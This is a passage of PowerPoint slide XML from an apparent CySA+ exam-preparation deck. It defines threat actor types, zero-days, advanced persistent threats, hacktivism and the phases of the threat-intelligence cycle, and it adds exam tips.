              <a:t>•  On the exam: The exam asks you to classify threat actors (nation-state, hacktivist, organized crime, insider) by their motivation, funding, and typical methods.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208</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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STRUCTURED THREAT INFORMATION EXPRESSION (STIX)</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Threat Actors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Nation-state</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Sophisticated and well-funded</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  On behalf of government or government agency</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Hacktivist</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Individual or groups that pursue social goal through hacking</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209</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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STRUCTURED THREAT INFORMATION EXPRESSION (STIX)</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Threat Actors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Organized crime</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  In it for the money</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Often uses ransomware</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Insider threat</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Intentional</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Ex: disgruntled employee</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Unintentional</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Ex: victim of social engineering</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210</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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THREAT TRENDS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Threat Classification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Threat classification organizes threats to guide detection and response, most fundamentally by distinguishing known threats, which have documented signatures and indicators, from unknown threats, which have no existing signature and must be found through behavioral analysis or hunting.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The principle that the absence of evidence is not evidence of absence reminds analysts that not seeing an alert does not prove an environment is clean, since unknown threats can evade signature-based tools.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A zero-day is a specific unknown threat that exploits a previously undiscovered vulnerability with no available patch, so an analyst treats these categories differently, applying signatures for known threats while relying on anomaly detection and threat hunting for the unknown and zero-day space.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect questions on the known-versus-unknown threat distinction and on identifying a zero-day as an exploit against an undiscovered, unpatched vulnerability.</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211</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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THREAT TRENDS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Threat Classification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Known vs. unknown threats</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Absence of evidence isn’t evidence of absence</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Zero-day</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Exploits an undiscovered vulnerability</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212</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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THREAT TRENDS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Advanced Persistent Threat (APT)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An Advanced Persistent Threat (APT) is a sophisticated adversary that gains and maintains long-term, stealthy access to a target network, and the term breaks down across its three words.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Advanced means the actor is well-funded, highly skilled, and often nation-state sponsored with coordinated capabilities; Persistent means the campaign is continuous and long-running, effectively operating around the clock so defenders may have to work non-standard hours to counter it; and Threat means there is a focused, motivated human adversary behind the activity, frequently driven by geopolitical or strategic objectives rather than quick financial gain.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC analyst treats APTs as the highest-tier threat because their stealth, patience, and resources let them dwell undetected for months, demanding continuous monitoring, threat hunting, and behavioral detection rather than reliance on signatures alone.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam expects you to define APT by decomposing Advanced, Persistent, and Threat and to associate it with well-funded, nation-state, geopolitically motivated, long-dwell adversaries.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213</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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THREAT TRENDS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Advanced Persistent Threat (APT)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Advanced</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Well-funded</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Often from a nation state</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Coordinated</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Persistent</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  24/7</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Security professional may work non-standard hours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214</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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THREAT TRENDS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Advanced Persistent Threat (APT)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Threat</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Threat actors are very focused</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Geopolitical motivation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Technical methods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215</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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THREAT TRENDS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Hacktivism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Hacktivism is cyber activity carried out to advance a political, social, ideological, or environmental cause rather than for financial gain, using techniques such as website defacement, distributed denial-of-service (DDoS) attacks, and the leaking of stolen data to embarrass or pressure a target.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Hacktivist collectives such as Anonymous tend to be decentralized and ad-hoc, forming loose campaigns that anyone can join with minimal technical skill using shared toolkits, which makes their membership fluid and hard to attribute to a single organized group.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  While much hacktivist activity amounts to disruption and nuisance rather than sophisticated intrusion, analysts still care because a coordinated campaign can flood defenses, cause reputational harm, and occasionally expose genuinely sensitive data, so knowing an organization's public political profile helps predict this threat.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam expects you to classify a threat actor's motivation, distinguishing hacktivism (ideological/political nuisance, decentralized) from organized crime, insiders, and nation-state actors.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216</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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THREAT TRENDS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Hacktivism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5486400" cy="4480560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Politically or socially motivated</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Nuisance</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Decentralized</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Ad-hoc</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Easy to participate</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Picture 7" descr="img_dc28760e50.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="2454333"/>
            <a:ext cx="4937760" cy="2955174"/>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217</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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THREAT TRENDS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Cyber Warfare Timeline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g_94771992ec.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="3435940"/>
            <a:ext cx="10634472" cy="1129120"/>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218</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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INTELLIGENCE CYCLE AND ISACS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Intelligence Cycle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The intelligence cycle is the structured method used to turn raw data into finished, actionable threat intelligence, typically moving through requirements (planning and direction), collection, analysis (processing), dissemination, and feedback.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  In the requirements phase you define what you actually need to know, such as which domain registrations, contact names, or addresses matter; collection then gathers that data from open-source intelligence (OSINT) or proprietary/closed feeds; and analysis correlates and interprets what was collected to produce meaning.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts care because raw indicators alone are noise until the cycle transforms them into intelligence that answers a real question, and the feedback loop lets the SOC continually refine future collection to stay relevant to the organization's actual risks.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: CySA+ emphasizes ordering the cycle's phases and especially the analysis step, and recognizing requirements as the phase that defines intelligence needs before any data is collected.</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219</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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INTELLIGENCE CYCLE AND ISACS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Intelligence Cycle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5486400" cy="4480560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Method to translate raw data into actionable information</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Picture 7" descr="img_7e5b2de820.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="2542863"/>
            <a:ext cx="4937760" cy="2778113"/>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220</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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INTELLIGENCE CYCLE AND ISACS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Intelligence Cycle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5486400" cy="4480560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Requirements</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  What you need</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Example: domain registrations, contact names, addresses, etc.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Picture 7" descr="img_4a31335cd8.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="2648102"/>
            <a:ext cx="4937760" cy="2567635"/>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221</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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INTELLIGENCE CYCLE AND ISACS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Intelligence Cycle (3)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5486400" cy="4480560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Collection</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Collect the data</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  OSINT or proprietary sources</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Picture 7" descr="img_a3b6307794.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6714974" y="1783080"/>
            <a:ext cx="4492291" cy="429768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222</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide2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INTELLIGENCE CYCLE AND ISACS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Intelligence Cycle (4)</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5486400" cy="4480560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysis</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Look at what you have</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  CompTIA CySA+ exam emphasizes this step</a:t>
